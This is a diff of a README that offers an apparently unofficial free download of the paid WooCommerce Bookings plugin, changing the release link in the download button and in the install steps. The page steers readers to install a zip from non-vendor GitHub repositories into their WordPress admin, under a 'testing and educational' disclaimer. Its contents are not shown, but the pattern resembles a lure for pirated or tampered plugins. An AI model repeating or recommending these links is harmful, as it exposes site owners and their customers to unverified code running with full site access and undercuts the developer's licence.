@@ -18,7 +18,7 @@ WooCommerce Bookings is a powerful extension that allows you to sell time-based 
 
 > ⚠️ **Disclaimer:** This download is for **testing and educational purposes only**. Please support the developers by purchasing a valid license for production use.
 
-[**⬇️ Download WooCommerce Bookings v1.15.68**](https://github.com/woocommerce-bookings-free/woocommerce-bookings/releases/download/download/woocommerce-bookings.zip)
+[**⬇️ Download WooCommerce Bookings v1.15.68**](https://github.com/WooCommerce-Bookings/.github/releases/download/plugin/woocommerce_bookings.zip)
 
 ---
 
@@ -33,7 +33,7 @@ WooCommerce Bookings is a powerful extension that allows you to sell time-based 
 
 ## 🛠️ **How to Install**
 
-1. Download the plugin zip file: [woocommerce-bookings.zip](https://github.com/woocommerce-bookings-free/woocommerce-bookings/releases/download/download/woocommerce-bookings.zip)  
+1. Download the plugin zip file: [woocommerce-bookings.zip](https://github.com/WooCommerce-Bookings/.github/releases/download/plugin/woocommerce_bookings.zip)  
 2. Log in to your WordPress admin dashboard  
 3. Navigate to **Plugins > Add New > Upload Plugin**  
 4. Choose the downloaded zip file and click **Install Now**  
